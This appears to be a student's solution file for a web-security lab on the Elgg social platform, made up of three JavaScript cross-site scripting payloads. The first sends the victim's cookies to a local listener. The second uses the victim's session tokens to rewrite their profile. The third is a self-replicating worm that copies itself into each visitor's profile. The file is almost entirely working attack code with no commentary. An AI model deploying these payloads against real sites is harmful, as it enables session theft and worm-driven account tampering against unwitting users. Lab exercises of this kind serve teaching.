// 任务一

<script>
document.write('<img src=http://localhost:5555?c=' + escape(document.cookie) + ' >');
</script>
// ===================================================================
// 任务二

<script type="text/javascript">
	window.onload = function() {
		var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
		var guid = "&guid=" + elgg.session.user.guid;
		var name = "&name=" + elgg.session.user.name;
		var desc = "&description=Samy is my hero. xzc" + "&accesslevel[description]=2";
		var content = elgg_token + elgg_ts + name + desc + guid;
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	
		if (elgg.session.user.guid != 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>

// ===================================================================
// 任务三

<script id="worm" type="text/javascript">
	window.onload = function() {
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jscodeTag = document.getElementById("worm").innerHTML;
		var footerTag = "</"+"script>"
		var wormcode = encodeURIComponent(headerTag+jscodeTag+footerTag);
		var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
		var guid = "&guid=" + elgg.session.user.guid;
		var name = "&name=" + elgg.session.user.name;
		var desc = "&description=Samy is my hero. xzc" + wormcode + "&accesslevel[description]=2";
		var content = elgg_token + elgg_ts + name + desc + guid;
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		if (elgg.session.user.guid != 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>
